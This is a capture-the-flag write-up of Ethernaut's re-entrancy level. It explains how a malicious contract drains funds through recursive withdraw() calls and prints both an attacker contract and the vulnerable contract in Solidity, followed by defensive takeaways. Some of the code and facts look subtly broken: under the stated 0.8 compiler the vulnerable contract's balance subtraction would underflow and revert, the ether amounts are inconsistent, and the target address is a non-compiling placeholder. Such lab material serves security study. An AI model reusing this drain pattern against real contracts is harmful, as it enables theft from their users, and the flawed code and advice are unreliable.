# Level 10 : Re-Entrancy

**Ethernaut level 10 : Re-entrancy**

What is re-entrancy : Re-entrancy happens in single-thread computing environments, when the execution stack jumps or calls subroutines, before returning to the original execution.

Number One of the [dasp.co](https://dasp.co/)

![Untitled](Level%2010%20Re-Entrancy%202a5ed0826f644b5ca5ccb61b1d6f3312/Untitled.png)

In the example above, Contract B is a malicious contract which recursively calls A.withdraw() to deplete Contract A’s funds. **Note that the fund extraction successfully finishes before Contract A returns from its recursive loop, and even realizes that B has extracted way above its own balance.**

The dangerous line for this level is the `msg.sender.call`*.* This will send money to some sender, which can be anyone or anything like a malicious contract.

1. The way here is to create a contract that give to re-entrance.sol, and then recursively withdraw from it until re-entrance is 0.
2. Several functions need to be created : 
    1. `contructor()` payable so that we can send Ether to our contract while deployment.
    2. `donate()` to send 0.01 ether to the Ethernaut contract
    3. `withdraw()` to trigger withdraw from Ethernaut contract
    4. `getBalance()` just to query the balance of either Ethernaut contract or our contract
    5. `fundMeBack()` to withdraw from Ethernaut contract once the level is finished
    6. `receive()` the loop that makes the magic happens. This is the important one function
3. Deploy the contract,use getBalance() to check the amount of Ethernaut contract
4. Deposit fund and then use the withdraw() function of our contract that will trigger the reentracy and the Ethernaut contract to transfer 0.001 ether to us back.
5. Submit instance 😃

# **Key Security Takeaways**

- The order of execution really matters in Solidity. If you must make external function calls, make the last thing you do (after all requisite checks and balances)
- Include a **mutex** to prevent re-entrancy, e.g. use a boolean `lock` variable to signal execution depth.
- Use `transfer` to move funds out of your contract, since it `throws`and limits gas forwarded. Low level functions like `call` and `send` just return false but don't interrupt the execution flow when the receiving contract fails.” — from Ethernaut level
- For more , have a look on this famous hack : [http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/](http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract Reenter{
    address payable addr_ = payable(address(// Ethernaut Contract Address));
    Reentrance level10 = Reentrance(addr_);
    constructor () public payable {}

    function donate(address _to) external payable {
        level10.donate{value: 0.001 ether}(_to);
    }
    function withdraw() external{
        level10.withdraw(0.001 ether);
    }
    function getBalance(address _who) external view returns (uint){
        return address(_who).balance;
    }
    function fundmeback(address payable _to) external payable{
        require(_to.send(address(this).balance), "could not send Ether");
    }
    receive() external payable {
        level10.withdraw(msg.value);
    }
}

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;
    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }
    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }
    function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value:_amount}("");
        if(result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
        }
    }
    receive() external payable {}
}
```